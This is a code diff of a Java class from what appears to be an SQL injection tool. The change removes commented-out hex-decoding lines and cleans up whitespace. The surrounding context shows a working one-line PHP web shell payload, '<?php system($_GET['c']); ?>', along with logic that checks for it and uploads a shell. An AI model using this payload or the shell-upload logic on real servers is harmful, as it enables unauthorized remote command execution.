@@ -193,7 +193,7 @@ public class RessourceAccessObject {
 
         List<String> f = new ArrayList<String>();
         f.add(path.substring(path.lastIndexOf('/'), path.length()));
-//        if (ToolsString.hexstr(hexResult).indexOf("<SQLi><?php system($_GET['c']); ?><iLQS>") > -1) {
+        
         if (hexResult.indexOf("<SQLi><?php system($_GET['c']); ?><iLQS>") > -1) {
             Request request = new Request();
             request.setMessage("CreateShellTab");
@@ -243,9 +243,8 @@ public class RessourceAccessObject {
 
         List<String> f = new ArrayList<String>();
         f.add(path.substring(path.lastIndexOf('/'), path.length()));
-//        if (ToolsString.hexstr(hexResult).indexOf(phpShell) > -1) {
+        
         if (hexResult.indexOf(phpShell) > -1) {
-            
             String crLf = "\r\n";
             URLConnection conn = null;
             OutputStream os = null;
@@ -366,7 +365,6 @@ public class RessourceAccessObject {
             request.setMessage("MarkFileSystemInvulnerable");
             MediatorModel.model().interact(request);
             hasFileRight = false;
-//        } else if ("false".equals(ToolsString.hexstr(hexResult))) {
         } else if ("false".equals(hexResult)) {
             LOGGER.warn("No FILE privilege");
             Request request = new Request();
@@ -409,8 +407,6 @@ public class RessourceAccessObject {
                 CallableFile currentCallable = taskCompletionService.take().get();
                 if (!"".equals(currentCallable.getFileSource())) {
                     String name = currentCallable.getUrl().substring(currentCallable.getUrl().lastIndexOf('/') + 1, currentCallable.getUrl().length());
-//                    String content = ToolsString.hexstr(currentCallable.getFileSource()).replace("\r", "");
-//                    String content = currentCallable.getFileSource().replace("\r", "");
                     String content = currentCallable.getFileSource();
                     String path = currentCallable.getUrl();
 
@@ -548,7 +544,7 @@ public class RessourceAccessObject {
 
         List<String> f = new ArrayList<String>();
         f.add(path.substring(path.lastIndexOf('/'), path.length()));
-//        if (ToolsString.hexstr(hexResult).indexOf(s) > -1) {
+
         if (hexResult.indexOf(s) > -1) {
             Request request = new Request();
             request.setMessage("CreateSQLShellTab");
